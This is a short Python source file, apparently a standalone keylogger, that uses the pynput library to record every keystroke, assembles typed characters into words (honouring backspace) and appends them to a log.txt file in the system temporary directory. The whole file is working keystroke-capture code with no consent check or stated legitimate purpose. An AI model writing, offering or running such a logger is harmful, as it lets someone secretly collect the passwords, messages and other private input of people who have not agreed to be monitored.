import os
import tempfile
from pynput import keyboard


temp_dir = tempfile.gettempdir()
LOG_FILE = os.path.join(temp_dir, 'log.txt')

word_buffer = []

def flush_word_to_file():
    if word_buffer:
        word = ''.join(word_buffer)
        with open(LOG_FILE, 'a') as f:
            f.write(word + '\n')
        word_buffer.clear()

def on_press(key):
    try:
        if key.char.isprintable():
            word_buffer.append(key.char)
    except AttributeError:
        if key == keyboard.Key.space or key == keyboard.Key.enter:
            flush_word_to_file()
        elif key == keyboard.Key.backspace and word_buffer:
            word_buffer.pop()

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()
